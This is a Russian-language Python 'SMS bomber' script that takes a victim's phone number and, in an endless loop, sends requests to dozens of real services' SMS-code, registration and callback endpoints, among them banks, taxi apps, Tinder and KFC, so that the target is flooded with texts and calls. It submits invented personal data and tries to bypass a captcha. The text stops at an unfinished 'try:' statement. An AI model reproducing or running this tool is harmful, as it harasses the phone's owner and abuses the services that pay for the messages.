import requests, random, time, os
from random import randint
from colorama import Fore, init
init(autoreset=True)


def banner():
    text = """
████████╗██████╗░░█████╗░██╗░░░░░██╗░░░░░░░░██╗░██╗░░██████╗███╗░░░███╗░██████╗
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██║░░░░░██████████╗██╔════╝████╗░████║██╔════╝
░░░██║░░░██████╔╝██║░░██║██║░░░░░██║░░░░░╚═██╔═██╔═╝╚█████╗░██╔████╔██║╚█████╗░
░░░██║░░░██╔══██╗██║░░██║██║░░░░░██║░░░░░██████████╗░╚═══██╗██║╚██╔╝██║░╚═══██╗
░░░██║░░░██║░░██║╚█████╔╝███████╗███████╗╚██╔═██╔══╝██████╔╝██║░╚═╝░██║██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚══════╝╚══════╝░╚═╝░╚═╝░░░╚═════╝░╚═╝░░░░░╚═╝╚═════╝░   
"""
    ban = ""
    for i in text:
        if i not in "\n █░":
            ban += f"\u001b[34m{i}\u001b[0m"
        elif i == "░":
            ban += f"\u001b[36m{i}\u001b[0m"
        elif i == "█":
            ban += f"\u001b[35m{i}\u001b[0m"
        else:
            ban += i
    print(ban)


banner()
# __________________________________________ Подготовка номеров
_phone = input('\n Введи ноMер (Без +): ')
if _phone[0] == '+':
    _phone = _phone[1:]
if _phone[0] in '8':
    _phone = '7' + _phone[1:]
if _phone[0] == '9':
    _phone = '7' + _phone
_name = ''
_email = 'm646856@gmail.com'
email = 'm646856'
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
_phone9 = _phone[1:]
_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[9:11]
# __________________________________________ Конец подготовки номеров

kol = input("\n Время атаки в сек.(Ставить не меньше 1000 , 0 - бесконечно): ")
if kol == str(0):
    kol = 100 ** 100

start_time = time.time()
CLOSE_AFTER = kol
N = 0
call = input("\n Tип атаки (1 - Атака звонками , 2 -Атака СМС) >>")

if call == str(1):
    os.system("clear")
    while True:
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED, "Атака закончена ! Нажмите на ENTER для закрытия программы......")
            break
        requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
        N += 1
        print(Fore.GREEN, '[+] findclone звонок отправлен! || Кол-во - ' + str(N))
        time.sleep(0.1)

print(Fore.MAGENTA)
if call == str(2):
    while True:
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED, "Атака закончена ! Нажмите на ENTER для закрытия программы......")
            input()
            break
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                      data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                            'deviceToken': '*'}, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        time.sleep(0.1)
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone})
            N += 1
            print('[+] RuTaxi отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Не отправлено !')
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            N += 1
            print('[+] BelkaCar отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Не отправленo !')
        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': _phone})
            N += 1
            print('[+] StarPizzaCafe отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            N += 1
            print('[+] Tinder отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            N += 1
            print('[+] Karusel отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            N += 1
            print('[+] Tinkoff отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            N += 1
            print('[+] Dostavista отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            N += 1
            print('[+] MonoBank отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
            N += 1
            print('[+] binotel отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": _phone})
            N += 1
            print('[+] SportMaster отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            N += 1
            print('[+] Alfalife отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            N += 1
            print('[+] KoronaPay отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://silpo.ua/graphql', data={
                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
                                       "__typename": "FlowResponse"}})
            N += 1
            print('[+] Silpo отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })
            N += 1
            print('[+] BTfair отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": 'mail@mail.com', "password": password,
                                "agreement": "on",
                                "oferta": "on", })
            N += 1
            print('[+] GGbet отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-]  не отправлено!')
        try:
            requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
            N += 1
            print('[+] ETM отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
            N += 1
            print('[+] TheLive отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            N += 1
            print('[+] MTS отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            N += 1
            print('[+] MyGames отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[+] error in sent!')
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999", "phone": (_phone, "+* (***) ***-**-**"),
                                "email": 'mail@mail.com',
                                "city": "Москва", })
            N += 1
            print('[+] Zoloto585 отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            N += 1
            print('[+] Kasta отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Kasta Не отправлено!')
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            N += 1
            print('[+] Тaxi отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "mail@mail.com", "x-email": "x-email", })
            N += 1
            print('[+] Mail.ru отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            N += 1
            print('[+] Creditter отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                                "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": 'mail@mail.com', })
            N += 1
            print('[+] Ingos отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            N += 1
            print('[+] Admiralxxx отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            N += 1
            print('[+] Av отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            N += 1
            print('[+] MTS отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            N += 1
            print('[+] City24 отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            N += 1
            print('[+] SushiMaster отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            N += 1
            print('[+] MultiPlex отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            N += 1
            print('[+] 3040 отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
            N += 1
            print('[+] Niyama отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Niyama не отправлено!')
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            N += 1
            print('[+] VSK отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] VSK не отправлено!')
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": password})
            N += 1
            print('[+] EasyPay отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            N += 1
            print('[+] Fix-Price отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
                                                     "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode",
                                                     "phone": _phone, "registration": "N", })
            N += 1
            print('[+] NovaLinia отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            N += 1
            print('[+] Tele2 отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            N += 1
            print('[+] Finam отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://makimaki.ru/system/callback.php',
                          params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
            N += 1
            print('[+] MakiMaki отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status',
                          headers={"Origin": "https://www.flipkart.com",
                                   "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                          json={"loginId": "+" + _phone, "supportAllStates": True})
            N += 1
            print('[+] FlipKart отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            N += 1
            print('[+] Online.ua отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            N += 1
            print('[+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client',
                          json={"country": 'Москва', "phone": _phone, })
            N += 1
            print('[+] OnTaxi отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            N += 1
            print('[+] Iqos отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/',
                          json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            N += 1
            print('[+] Smart.Space отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            N += 1
            print('[+] KFC отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                                'phone': _phone})
            N += 1
            print('[+] tarantino-family отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            N += 1
            print('[+] Apteka отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            N += 1
            print('[+] Uklon отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            N += 1
            print('[+] Ozon отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            N += 1
            print('[+] Banki отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            N += 1
            print('[+] IVI отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            N += 1
            print('[+] Moyo отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            N += 1
            print('[+] Helsi отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[+] не отправлено!')
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                          json={"Phone": _phone, "Type": 1})
            N += 1
            print('[+] KinoLend отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://pizzahut.ru/account/password-reset',
                          data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                                '_token': '*'})
            N += 1
            print('[+] PizzaHut отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            N += 1
            print('[+] Rabota отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
            N += 1
            print('[+] Rutube отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Rutube in sent!')
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            N += 1
            print('[+] Citilink отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
            N += 1
            print('[+] Smsint отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
            N += 1
            print('[+] oyorooms отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
            N += 1
            print('[+] MVIDEO отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
                'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone, 'typeKeys': ['Unemployed']}},
                                                              'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            N += 1
            print('[+] newnext отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            N += 1
            print('[+] Sunlight отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone,
                                'deliveryOption': 'sms'})
            N += 1
            print('[+] alpari отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            N += 1
            print('[+] Invitro отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': _phone}, 'id': '1'})
            N += 1
            print('[+] Sberbank отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                          json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов', 'sex': '1',
                                'birthDate': '10.10.2000', 'mobilePhone': _phone9, 'russianFederationResident': 'true',
                                'isDSA': 'false', 'personalDataProcessingAgreement': 'true',
                                'bKIRequestAgreement': 'null', 'promotionAgreement': 'true'})
            N += 1
            print('[+] Psbank отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            N += 1
            print('[+] Beltelcom отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            N += 1
            print('[+] Karusel отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            N += 1
            print('[+] KFC отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            N += 1
            print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            N += 1
            print('[+] MTS отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            N += 1
            print('[+] Delitime отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            N += 1
            print('[+] findclone звонок отправлен! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] Звонок не отпрвлен !')
        try:
            requests.post("https://guru.taxi/api/v1/driver/session/verify",
                          json={"phone": {"code": 1, "number": _phone}})
            N += 1
            print('[+] Guru отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            N += 1
            print('[+] ICQ отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + _phone, "phone_permission": "unknown", "stream_id": 0,
                                "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
            N += 1
            print('[+] InDriver отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + _phone})
            N += 1
            print('[+] Invitro отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            N += 1
            print('[+] Pmsm отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
            N += 1
            print('[+] IVI отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            N += 1
            print('[+] Lenta отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
            N += 1
            print('[+] Mail.ru отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            N += 1
            print('[+] MVideo отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            N += 1
            print('[+] OK отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
            N += 1
            print('[+] qlean отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
            N += 1
            print('[+] Qlean отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            N += 1
            print('[+] SMSgorod отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            N += 1
            print('[+] Tinder отправлено! || Кол-во - ' + str(N))
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            N += 1
            print('[+] Twitch отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            N += 1
            print('[+] CabWiFi отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            N += 1
            print('[+] wowworks отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            N += 1
            print('[+] Eda.Yandex отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            N += 1
            print('[+] Youla отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            N += 1
            print('[+] Alpari отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            N += 1
            print('[+] SMS отправлено! || Кол-во - ' + str(N))
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
        try:
